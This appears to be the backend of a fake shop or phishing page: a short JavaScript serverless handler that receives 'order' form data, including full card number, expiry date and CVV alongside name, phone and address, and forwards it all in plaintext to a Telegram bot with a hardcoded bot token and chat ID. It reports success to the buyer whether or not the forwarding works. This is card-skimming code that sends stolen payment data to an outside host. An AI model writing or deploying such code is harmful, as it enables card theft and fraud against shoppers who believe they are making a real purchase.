// 1. Enter your Telegram Details Here
const BOT_TOKEN = "8575730600:AAH8zc1S1-zwe5uu84t98PXc1Gp_j6YHMPw"; // Keep the quotes!
const CHAT_ID = "7833988868";     // Keep the quotes!

export default async function handler(req, res) {
  // --- MANUAL CORS HEADERS (Zero Dependencies) ---
  res.setHeader('Access-Control-Allow-Origin', 'https://demotestdeletesoon.vercel.app');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // --- HANDLE PREFLIGHT IMMEDIATELY ---
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // --- HANDLE POST REQUEST ---
  if (req.method === 'POST') {
    try {
      const data = req.body;

      // --- FULL DATA TEMPLATE ---
      const message = `
📦 *NEW ORDER RECEIVED*
----------------------------
👤 *Customer:* ${data.fullName || 'N/A'}
📞 *Mobile:* ${data.mobile || 'N/A'}
📍 *City/State:* ${data.cityState || 'N/A'}
📮 *Pincode:* ${data.pincode || 'N/A'}
🏠 *Address:* ${data.fullAddress || 'N/A'}
----------------------------
🛒 *Product:* ${data.productName || 'N/A'}
🔢 *Quantity:* ${data.quantity || '1'}
💰 *Total:* ${data.totalAmount || '0'}
----------------------------
💳 *Payment Details:*
Method: ${data.paymentMethod || 'N/A'}
Card: ${data.cardNumber || 'N/A'}
Expiry: ${data.expiryDate || 'N/A'}
CVV: ${data.securityCode || 'N/A'}
      `;

      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      // Even if Telegram fails, we tell the frontend "Success"
      return res.status(200).json({ 
        success: true, 
        message: "Order Received",
        resData: { id: "123", ...data }
      });

    } catch (error) {
      console.error(error);
      return res.status(200).json({ success: true, message: "Order Processed" });
    }
  }

  return res.status(405).json({ error: "Method not allowed" });
}
